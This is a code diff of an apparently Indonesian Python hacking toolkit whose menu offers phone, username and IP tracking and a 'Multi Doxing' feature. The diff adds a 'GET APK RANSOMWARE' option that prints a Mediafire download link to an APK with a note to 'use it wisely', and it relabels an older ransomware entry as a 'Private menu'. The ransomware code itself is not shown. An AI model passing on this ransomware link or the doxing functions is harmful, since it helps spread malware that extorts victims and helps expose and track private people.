@@ -311,6 +311,7 @@ def wp_security_menu():
         wordlist_stats(wl)
     input(f'\n{Wh}[ {Gr}+ {Wh}] {Gr}Press enter to continue')
 
+
 # -------------------------
 # Rolandino Multi-Doxing functions (integrated)
 # -------------------------
@@ -611,7 +612,7 @@ def multi_dox_menu():
     
 def main_menu():
     options2 = [
-        {'num': 1, 'text': 'IP Tracker', 'func': IP_Track},
+        {'num': 1, 'text': 'GET APK RANSOMWARE', 'func': show_link_message},
         {'num': 2, 'text': 'Show Your IP', 'func': showIP},
         {'num': 3, 'text': 'Phone Number Tracker', 'func': phoneGW},
         {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
@@ -637,7 +638,16 @@ def main_menu():
                 print("Pilihan tidak valid, coba lagi.")
         except ValueError:
             print("Input harus angka!")    
-
+def about_menu():
+    show_text("Tools ini dibuat oleh NexulTzy-404.\nGunakan dengan bijak!")
+    
+    
+def show_link_message():
+    message = """https://www.mediafire.com/file/xaxumq3f4og3fk4/NexultzyNewApp2.apk/file
+Harap Gunakan Lah Apk Ini Dengan bijak!!."""
+    print("\n" + message + "\n")
+    input("Tekan Enter untuk kembali ke menu utama...")
+    main_menu()  # pastikan main_menu() sudah kamu definisikan
 # -------------------------
 # Options and main menu
 # -------------------------
@@ -648,7 +658,7 @@ options = [
     {'num': 4, 'text': 'Username Tracker', 'func': TrackLu},
     {'num': 5, 'text': 'WordPress Security Check (safe)', 'func': wp_security_menu},
     {'num': 6, 'text': 'Multi Doxing Intelligence (NEXULTZY)', 'func': multi_dox_menu},
-    {'num': 7, 'text': 'Get Apk Ransomware', 'func': main_menu},    
+    {'num': 7, 'text': 'Private menu', 'func': main_menu},    
     {'num': 0, 'text': 'Exit', 'func': exit}
 ]
 
